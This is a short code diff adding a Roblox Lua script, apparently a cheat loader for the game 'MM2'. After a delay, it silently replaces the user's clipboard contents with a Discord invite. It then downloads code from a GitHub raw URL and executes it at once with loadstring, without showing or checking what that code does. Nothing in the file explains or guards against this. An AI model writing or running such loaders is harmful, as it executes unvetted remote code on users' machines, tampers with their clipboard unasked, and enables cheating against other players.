@@ -1,0 +1,5 @@
+task.spawn(function()
+    task.wait(3)
+    setclipboard("https://discord.gg/9a3eaGvTYp")
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vertix-hub/mm2/refs/heads/main/reversehub"))()
